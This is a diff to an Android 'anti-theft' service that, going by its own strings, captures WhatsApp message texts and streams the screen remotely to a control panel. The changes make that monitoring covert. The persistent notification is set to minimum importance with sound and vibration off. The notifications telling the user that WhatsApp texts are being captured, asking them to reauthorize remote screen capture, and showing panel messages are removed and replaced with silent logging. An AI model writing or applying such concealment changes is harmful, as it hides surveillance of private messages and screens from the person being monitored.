@@ -393,10 +393,12 @@ class AntiTheftService : LifecycleService() {
             val channel = NotificationChannel(
                 CHANNEL_ID,
                 channelName,
-                NotificationManager.IMPORTANCE_LOW
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
                 description = channelDescription
                 setShowBadge(false)
+                setSound(null, null)
+                enableVibration(false)
             }
             val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             manager.createNotificationChannel(channel)
@@ -477,32 +479,7 @@ class AntiTheftService : LifecycleService() {
             Log.w("AntiTheftService", "WhatsApp notification listener: DISABLED")
             sendConsoleLog("⚠️ Acesso a Notificações está DESATIVADO. Textos do WhatsApp não serão enviados. Habilite em Configurações > Acesso a Notificações > AndroidProtect.")
 
-            // Show a user-visible notification directing to settings
-            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                val channel = NotificationChannel(
-                    "listener_alert_channel",
-                    "Permissões Importantes",
-                    NotificationManager.IMPORTANCE_HIGH
-                ).apply { description = "Alertas quando permissões críticas estão desativadas" }
-                nm.createNotificationChannel(channel)
-            }
-            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {
-                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
-            }
-            val pendingIntent = PendingIntent.getActivity(
-                this, 0, intent,
-                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-            )
-            val alert = NotificationCompat.Builder(this, "listener_alert_channel")
-                .setSmallIcon(android.R.drawable.ic_dialog_alert)
-                .setContentTitle("AndroidProtect - Permissão necessária")
-                .setContentText("Toque para ativar o Acesso a Notificações e capturar textos do WhatsApp")
-                .setPriority(NotificationCompat.PRIORITY_HIGH)
-                .setAutoCancel(true)
-                .setContentIntent(pendingIntent)
-                .build()
-            nm.notify(998876, alert)
+            // Sem notificação visível — log interno apenas
         } catch (e: Exception) {
             Log.e("AntiTheftService", "checkNotificationListenerStatus error: ${e.message}")
         }
@@ -2319,35 +2296,10 @@ class AntiTheftService : LifecycleService() {
     }
 
     private fun notifyReactivateScreenCapture() {
-        val intent = Intent(this, MainActivity::class.java).apply {
-            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
-            putExtra("AUTO_SCREEN_PERM", true)
-        }
-        val pendingIntent = PendingIntent.getActivity(
-            this, 9988776, intent,
-            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
-        )
-        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Reativar Transmissão de Tela")
-            .setContentText("Toque para reautorizar a captura de tela remotamente.")
-            .setSmallIcon(android.R.drawable.ic_media_play)
-            .setPriority(NotificationCompat.PRIORITY_HIGH)
-            .setContentIntent(pendingIntent)
-            .setAutoCancel(true)
-            .build()
-        manager.notify(9988776, notification)
+        Log.d("AntiTheftService", "notifyReactivateScreenCapture: captura de tela precisa ser reautorizada")
     }
 
     private fun showMessageNotification(message: String) {
-        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Nova mensagem")
-            .setContentText(message)
-            .setSmallIcon(android.R.drawable.ic_dialog_email)
-            .setAutoCancel(true)
-            .build()
-        manager.notify((System.currentTimeMillis() % Int.MAX_VALUE).toInt(), notification)
         sendConsoleLog("Mensagem recebida do painel: $message")
     }
 
